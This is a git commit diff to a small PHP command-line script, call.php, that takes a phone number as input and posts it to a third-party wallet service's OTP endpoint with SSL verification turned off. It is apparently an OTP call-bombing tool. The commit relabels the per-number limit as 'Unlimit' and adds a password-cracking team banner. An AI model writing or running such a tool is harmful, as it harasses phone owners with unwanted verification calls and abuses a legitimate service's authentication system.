621056a055485246d27556138c45ee39fe95b215
CAMRYBOY45 <44989007+CAMRYBOY45@users.noreply.github.com>
2019-06-15 16:36:45 +0700

    Update call.php

--- call.php
+++ call.php
@@ -1,5 +1,5 @@
 <?php
-// Limit 3x Telpon Setiap Satu Nomor
+// Unlimit
 function send($phone){
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
@@ -11,7 +11,7 @@ function send($phone){
         curl_close($ch);
                 echo $asw."\n";
 }
-echo "COPYRIGHT ; SGBTEAM\n\n";
+echo "Mr.C1TY3920 ; 😈KING$~CRACKING√PASSWORD👿 Team\n\n";
 echo "Nomor\nInput : ";
 $nomor = trim(fgets(STDIN));
 $execute = send($nomor);
